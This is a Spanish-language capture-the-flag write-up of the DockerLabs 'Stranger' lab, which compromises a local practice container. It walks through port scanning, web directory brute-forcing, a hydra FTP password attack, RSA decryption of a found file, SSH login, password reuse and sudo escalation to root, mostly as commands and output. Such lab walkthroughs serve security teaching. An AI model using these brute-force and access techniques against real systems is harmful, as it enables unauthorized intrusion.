---
title: DockerLabs - Stranger
summary: "Write-up del laboratorio Stranger de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: [medio, text decryption, brute force, sudo]
media_subpath: "/assets/img/posts/dockerlabs_stranger"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ nmap -sCV -p21,22,80 172.17.0.2         
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:af:01:77:e8:fc:a4:95:85:6b:5c:9c:c7:c1:d3:98 (ECDSA)
|_  256 36:7e:d3:25:fa:59:38:8f:2e:21:f9:f0:28:a4:7e:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: welcome
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: my; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

Comenzaremos revisando el puerto 80 de la máquina, donde nos encontramos con el siguiente mensaje:

![Desktop View](/20260108184730.webp){: width="500" height="320" .shadow}

Mientras revisamos otros sitios de la máquina, dejaremos en segundo plano **gobuster** obteniendo por fuerza bruta recursos existentes en el servidor web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 231]
/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
```

Encontramos el recurso `/strange`, el cual resulta ser un blog:

![Desktop View](/20260108184945.webp){: width="972" height="589" .shadow}

Debido a que bajo el recurso `/strange` pueden haber más recursos, procedemos a ejecutar nuevamente **gobuster**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ gobuster dir -u "http://172.17.0.2/strange" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/strange
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 3040]
/private.txt          (Status: 200) [Size: 64]
/secret.html          (Status: 200) [Size: 172]

===============================================================
Finished
===============================================================
```

Nos descargamos el fichero `/private.txt`, y vemos que se trata de texto codificado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ cat private.txt               
`O��N�����f-�]�T��K.Q�a���mgu�3��i������ȉ����P�+F�8Q[                                                                                                                                                                                    
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ file private.txt                         
private.txt: data
```

En el recurso `/secret.html` encontramos el siguiente mensaje, donde indican que el usuario `admin` es válido por FTP en la máquina, pero debemos encontrar la contraseña (la cual se encuentra dentro del fichero `rockyou.txt`):

![Desktop View](/20260108185555.webp){: width="700" height="460" .shadow}

## acceso inicial (mwheeler)

Para encontrar la contraseña del usuario `admin` por FTP, emplearemos **hydra**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ hydra -l admin -P /usr/share/seclists/Passwords/rockyou.txt 172.17.0.2 ftp -I -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://172.17.0.2:21/
[21][ftp] host: 172.17.0.2   login: admin   password: ******
1 of 1 target successfully completed, 1 valid password found
```

Teniendo ya acceso por FTP a la máquina, nos conectamos, y encontramos un fichero con extensión `.pem`, el cual nos bajamos para inspeccionarlo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 Welcome to my FTP server
Name (172.17.0.2:elcybercurioso): admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40029|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             522 May 01  2024 private_key.pem
226 Directory send OK.
ftp> get private_key.pem
local: private_key.pem remote: private_key.pem
229 Entering Extended Passive Mode (|||40082|)
150 Opening BINARY mode data connection for private_key.pem (522 bytes).
100% |*********************************************************************************************************************************************************************|   522        1.47 MiB/s    00:00 ETA
226 Transfer complete.
522 bytes received in 00:00 (263.71 KiB/s)
ftp> exit
221 Goodbye.
```

Vemos que se trata de una clave privada:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ cat private_key.pem
-----BEGIN PRIVATE KEY-----
MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA4/scrsX2G1QjCHdP
...
ajmuxxKdJvFL
-----END PRIVATE KEY-----
```

Este tipo de claves privadas se pueden generar empleando **RSA** (algoritmo de encriptación pública).

Lo que hemos encontrado hasta ahora es:
- Un fichero que contiene un texto codificado
- Una palabra clave, la cual nos la indicaban en una de las entradas del blog.
- Una clave privada encontrada en el servidor FTP.

En este punto tenemos lo necesario para desencriptar la cadena codificada, y para ello usaremos la herramienta [CyberChef.io](https://cyberchef.io) (para evitar que el contenido de la cadena codificada se vea afectado, optamos por convertirlo a Base64, siendo la decodificación el primer paso que debemos hacer al tratar de desencriptar la cadena):

![Desktop View](/20260108191018.webp){: width="972" height="589" .shadow}

Habremos obtenido una palabra, la cual podemos tratar de ver si se trata de la contraseña de algún usuario.

Sin embargo, no sabemos a que usuario pertenece, pero recordamos que, en la página principal, se mencionaba a `mwheeler`, siendo el formato del usuario el que se suele emplear para definir usuarios en el sistema (primera letra del nombre + el apellido), así que probamos a ver si la contraseña pertenece a esta usuaria por SSH (comprobamos que efectivamente es su contraseña):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Stranger]
└─$ ssh mwheeler@172.17.0.2
mwheeler@291b1a5902ac:~$ whoami
mwheeler
mwheeler@291b1a5902ac:~$ hostname
291b1a5902ac
```

Procedemos a listar los usuarios del sistema que tengan una consola asignada:

```bash
mwheeler@291b1a5902ac:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mwheeler:x:1001:1001::/home/mwheeler:/bin/bash
admin:x:1002:1002::/home/admin:/bin/sh
```

## movimiento lateral (admin)

Dado que también teníamos unas credenciales para el usuario `admin`, probamos a ver si se está reutilizando la contraseña que tiene en el servicio FTP para acceder a la máquina, y vemos que sí se están reutilizando, por lo que ganamos acceso como este usuario en el sistema:

```bash
mwheeler@291b1a5902ac:~$ su admin
Password: 
$ whoami
admin
```

## escalada de privilegios (root)

Al ir a comprobar los permisos SUDO que tiene este usuario, nos daremos cuenta de que tiene permisos elevados en el sistema:

```bash
admin@291b1a5902ac:/home/mwheeler$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on 291b1a5902ac:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on 291b1a5902ac:
    (ALL) ALL
```

Esto implica que podemos invocar una consola como el usuario `root` sin tener que aportar su contraseña:

```bash
admin@291b1a5902ac:/home/mwheeler$ sudo su
root@291b1a5902ac:/home/mwheeler# whoami
root
```

En el directorio `/root` encontramos la flag:

```bash
root@291b1a5902ac:~# cat flag.txt 
This is the root flat - Fl@ggR00t -
```

De esta manera habremos completado la máquina `Stranger`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>